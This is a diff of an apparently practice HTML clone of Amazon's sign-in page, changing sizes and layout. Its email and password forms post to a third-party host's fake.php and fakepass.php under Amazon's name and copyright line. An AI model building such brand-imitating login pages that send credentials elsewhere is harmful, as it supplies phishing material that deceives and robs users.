@@ -10,14 +10,16 @@
 </head>
 <body>
 
-    <img src = "https://via.placeholder.com/150" title = "Imagine the Amazon logo.">
+    <img src = "https://via.placeholder.com/150" height = 60 title = "Imagine the Amazon logo.">
+
+    <div>
 
     <h1>Sign In</h1>
-    <p>Email(phone or mobile accounts) &emsp;&emsp;&emsp; <a id = "forgot" href= "http://www.google.com">  Forgot Password</a> </p>
+    <p>Email(phone or mobile accounts)  </p>
 
     <Form action="http://www.vancecole.net/fake.php">
         <p>
-            <input type = "text" name = "email" maxlength = 100 placeholder="Enter Email"/>
+            <input type = "text" name = "email" size = 40 maxlength = 100 placeholder="Enter Email"/>
             <!--Need to reject too many characters.-->
 
 
@@ -26,31 +28,31 @@
 
     </Form>
 
-    <p>Password</p>
+    <p>Password &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; <a id = "forgot" href= "http://www.google.com">  Forgot Password</a> </p>
     <!--Use the password form.-->
 
     <Form action = "http://www.vancecole.net/fakepass.php">
 <p>
-    <input type = "password" name ="password" maxlength = 100 placeholder = "Enter Password"/>
+    <input type = "password" name ="password" size = 40 maxlength = 100 placeholder = "Enter Password"/>
 </p>
 
     </Form>
 
     <!--Thanks to Sitepoint for information on drawing a rectangle.-->
-    <div id ="continue" style="width:500px;height:20px;border:1px solid #000;">Continue</div>
+    <div id ="continue" style="width:300px;height:15px;border:1px solid #000;">Continue</div>
 
     <ul id = "help">
         <li>Need help?</li>
     </ul>
-
+</div>
     <p>New to Amazon?</p>
 
-    <div id = "account" style="width:500px;height:20px; border:1px solid #000;">Create Your Amazon Account</div>
-<!-- style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" -->
+    <div id = "account" style="width:320px;height:15px; border:1px solid #000;">Create Your Amazon Account</div>
+
 <br>
 <hr>
 
-<p>Conditions of use &emsp; Privacy Policy &emsp; Help</p>
+<p id ="bottom">Conditions of use &emsp; Privacy Policy &emsp; Help</p>
 
 <p>&copy; 1996-2020, Amazon.com,inc or its affiliates</p>
 </body>
